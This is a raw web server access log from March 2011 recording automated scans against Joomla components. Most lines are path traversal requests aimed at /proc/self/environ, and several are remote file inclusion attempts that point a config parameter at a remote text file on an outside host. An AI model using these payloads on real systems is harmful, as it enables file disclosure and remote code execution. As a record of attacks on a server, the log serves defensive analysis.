88.191.75.19 - - [21/Mar/2011:14:08:03 +0900] "GET /////////index.php?option=com_jinventory&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 223
95.131.64.51 - - [21/Mar/2011:14:09:12 +0900] "GET /////////index.php?option=com_wisroyq&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 223
95.131.64.51 - - [21/Mar/2011:14:10:17 +0900] "GET /////////index.php?option=com_wisroyq&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 223
74.54.184.50 - - [21/Mar/2011:14:10:54 +0900] "GET ////?option=com_ccnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 200 956
192.188.242.80 - - [21/Mar/2011:14:11:29 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:14:11:32 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
211.206.120.196 - - [21/Mar/2011:14:18:36 +0900] "GET /access_log.last//index.php?option=com_lovefactory&controller=../../../../../../../../../../../../../../..//proc/self/environ HTTP/1.1" 404 232
178.63.99.78 - - [21/Mar/2011:14:18:58 +0900] "GET //index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.63.99.78 - - [21/Mar/2011:14:20:49 +0900] "GET //index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
216.119.135.66 - - [21/Mar/2011:14:22:06 +0900] "GET /index.php?option=com_beeheard&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
217.16.3.142 - - [21/Mar/2011:14:28:40 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:14:28:48 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
188.40.100.196 - - [21/Mar/2011:14:31:11 +0900] "GET ////////index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
188.40.100.196 - - [21/Mar/2011:14:31:15 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
76.97.16.122 - - [21/Mar/2011:14:31:49 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:31:49 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:31:53 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
188.40.100.196 - - [21/Mar/2011:14:32:25 +0900] "GET //index.php?option=com_userstatus&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:33:04 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
188.40.100.196 - - [21/Mar/2011:14:33:32 +0900] "GET ////////index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
175.117.144.37 - - [21/Mar/2011:14:33:44 +0900] "GET /access_log.last//index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 233
175.117.144.37 - - [21/Mar/2011:14:33:47 +0900] "GET //index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
175.117.144.37 - - [21/Mar/2011:14:33:48 +0900] "GET /access_log//index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 228
112.216.153.186 - - [21/Mar/2011:14:37:50 +0900] "GET /access_log.last//index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
112.216.153.186 - - [21/Mar/2011:14:37:52 +0900] "GET //index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
70.32.104.240 - - [21/Mar/2011:14:38:35 +0900] "GET /?option=com_jvehicles&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 954
217.16.3.142 - - [21/Mar/2011:14:38:53 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:14:38:57 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:39:20 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:39:48 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:39:54 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:14:40:01 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:14:41:04 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:41:04 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:41:04 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:41:05 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:41:06 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:41:06 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:41:06 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:41:06 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:42:29 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:42:30 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:42:31 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:42:31 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:43:02 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:43:03 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:43:40 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:43:41 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
91.208.92.9 - - [21/Mar/2011:14:48:43 +0900] "GET /!lfi../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 300
91.208.92.9 - - [21/Mar/2011:14:49:32 +0900] "GET /access_log.last/!lfi../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 316
91.208.92.9 - - [21/Mar/2011:14:49:33 +0900] "GET /!lfi../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 300
187.61.61.182 - - [21/Mar/2011:14:49:50 +0900] "GET /index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.208.92.9 - - [21/Mar/2011:14:49:59 +0900] "GET /!lfi../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 300
91.208.92.9 - - [21/Mar/2011:14:50:12 +0900] "GET //index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.245.128 - - [21/Mar/2011:14:50:28 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:50:28 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:50:29 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:50:29 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:50:29 +0900] "GET /access_log.last//*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 224
94.23.245.128 - - [21/Mar/2011:14:50:29 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:50:30 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
94.23.245.128 - - [21/Mar/2011:14:50:30 +0900] "GET //*?option=com_rpx&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 208
187.61.61.182 - - [21/Mar/2011:14:50:37 +0900] "GET /index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:14:50:58 +0900] "GET /access_log.last/index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
187.61.61.182 - - [21/Mar/2011:14:51:00 +0900] "GET /index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.208.92.9 - - [21/Mar/2011:14:51:05 +0900] "GET //index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.208.92.9 - - [21/Mar/2011:14:52:31 +0900] "GET /access_log.last/!lfi../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 316
91.208.92.9 - - [21/Mar/2011:14:52:32 +0900] "GET /!lfi../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 300
187.61.61.182 - - [21/Mar/2011:14:52:34 +0900] "GET /access_log/index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
187.61.61.182 - - [21/Mar/2011:14:52:35 +0900] "GET /index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:14:53:54 +0900] "GET /access_log.last/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
187.61.61.182 - - [21/Mar/2011:14:53:54 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
98.130.2.43 - - [21/Mar/2011:14:54:24 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
94.23.35.111 - - [21/Mar/2011:14:54:26 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:14:54:30 +0900] "GET /access_log/index.php?option=com_rd_download&view=download&cid=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
187.61.61.182 - - [21/Mar/2011:14:54:42 +0900] "GET /access_log/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
187.61.61.182 - - [21/Mar/2011:14:54:43 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
98.130.2.43 - - [21/Mar/2011:14:55:07 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
98.130.2.43 - - [21/Mar/2011:14:55:29 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:14:55:38 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.64.167 - - [21/Mar/2011:14:55:40 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:14:55:42 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.64.167 - - [21/Mar/2011:14:55:50 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
94.23.35.111 - - [21/Mar/2011:14:55:58 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:14:56:29 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:14:56:31 +0900] "GET /access_log.last/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
187.61.61.182 - - [21/Mar/2011:14:56:31 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
94.23.35.111 - - [21/Mar/2011:14:59:19 +0900] "GET /index.php?option=com_jfeedback&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:14:59:48 +0900] "GET /index.php?option=com_jfeedback&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
112.216.153.186 - - [21/Mar/2011:15:00:51 +0900] "GET //index2.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
187.61.61.182 - - [21/Mar/2011:15:01:26 +0900] "GET /index.php?option=com_jfeedback&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
123.30.110.38 - - [21/Mar/2011:15:02:02 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
123.30.110.38 - - [21/Mar/2011:15:02:05 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:15:02:50 +0900] "GET /access_log/index.php?option=com_jfeedback&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
187.61.61.182 - - [21/Mar/2011:15:02:50 +0900] "GET /index.php?option=com_jfeedback&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:05:48 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:05:49 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:05:49 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:05:52 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.208.92.9 - - [21/Mar/2011:15:06:56 +0900] "GET /access_log.last//components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=test?? HTTP/1.1" 404 288
91.208.92.9 - - [21/Mar/2011:15:06:57 +0900] "GET /access_log.last//components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://www.autocorse.gr//cache/pox.txt?? HTTP/1.1" 404 288
91.208.92.9 - - [21/Mar/2011:15:06:59 +0900] "GET //components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=test?? HTTP/1.1" 404 272
91.208.92.9 - - [21/Mar/2011:15:07:01 +0900] "GET //components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://www.autocorse.gr//cache/pox.txt?? HTTP/1.1" 404 272
175.117.144.37 - - [21/Mar/2011:15:07:26 +0900] "GET //index2.php?option=com_linkr&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
187.61.61.182 - - [21/Mar/2011:15:08:07 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:08:11 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:08:14 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:08:14 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.208.92.9 - - [21/Mar/2011:15:08:19 +0900] "GET /access_log.last//components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=test?? HTTP/1.1" 404 288
91.208.92.9 - - [21/Mar/2011:15:08:21 +0900] "GET /access_log.last//components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://www.autocorse.gr//cache/pox.txt?? HTTP/1.1" 404 288
91.208.92.9 - - [21/Mar/2011:15:08:22 +0900] "GET //components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=test?? HTTP/1.1" 404 272
91.208.92.9 - - [21/Mar/2011:15:08:24 +0900] "GET //components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=http://www.autocorse.gr//cache/pox.txt?? HTTP/1.1" 404 272
187.61.61.182 - - [21/Mar/2011:15:09:39 +0900] "GET //index.php?option=com_product&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:15:09:39 +0900] "GET //index.php?option=com_product&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:15:09:40 +0900] "GET //index.php?option=com_product&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:15:09:40 +0900] "GET //index.php?option=com_product&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:15:10:03 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:10:22 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:15:10:25 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:10:34 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:15:10:54 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
112.216.153.186 - - [21/Mar/2011:15:10:59 +0900] "GET //index2.php?option=com_linkr&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
76.97.16.122 - - [21/Mar/2011:15:11:22 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:15:12:34 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:13:05 +0900] "GET /index.php?option=com_econtent&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:13:08 +0900] "GET /index.php?option=com_econtent&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:13:11 +0900] "GET /index.php?option=com_econtent&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
187.61.61.182 - - [21/Mar/2011:15:13:14 +0900] "GET /index.php?option=com_econtent&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
112.216.153.186 - - [21/Mar/2011:15:20:00 +0900] "GET /access_log.last//index2.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
112.216.153.186 - - [21/Mar/2011:15:20:01 +0900] "GET //index2.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
178.63.99.78 - - [21/Mar/2011:15:20:38 +0900] "GET /////index.php?option=com_econtent&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 219
80.38.87.254 - - [21/Mar/2011:15:22:15 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
217.16.3.142 - - [21/Mar/2011:15:22:52 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:22:53 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.63.99.78 - - [21/Mar/2011:15:23:36 +0900] "GET /////index.php?option=com_econtent&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 219
187.61.61.182 - - [21/Mar/2011:15:23:40 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
187.61.61.182 - - [21/Mar/2011:15:23:48 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
184.107.165.2 - - [21/Mar/2011:15:23:52 +0900] "GET ////////index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
187.61.61.182 - - [21/Mar/2011:15:24:16 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
95.131.64.51 - - [21/Mar/2011:15:24:51 +0900] "GET /index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
109.123.86.244 - - [21/Mar/2011:15:25:13 +0900] "GET //index.php?option=com_svmap&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
184.107.165.2 - - [21/Mar/2011:15:27:09 +0900] "GET ////////index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 222
95.131.64.51 - - [21/Mar/2011:15:28:40 +0900] "GET /index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
69.67.54.185 - - [21/Mar/2011:15:30:25 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:30:25 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:30:26 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:15:30:27 +0900] "GET /index.php?option=com_linkr&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
69.67.54.185 - - [21/Mar/2011:15:30:29 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:30:29 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:30:29 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:30:39 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:30:52 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:30:53 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
175.117.144.37 - - [21/Mar/2011:15:31:34 +0900] "GET /access_log//index2.php?option=com_linkr&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 228
175.117.144.37 - - [21/Mar/2011:15:31:39 +0900] "GET //index2.php?option=com_linkr&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
175.117.144.37 - - [21/Mar/2011:15:31:42 +0900] "GET /access_log.last//index2.php?option=com_linkr&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 233
222.231.63.26 - - [21/Mar/2011:15:32:04 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
222.231.63.26 - - [21/Mar/2011:15:33:06 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
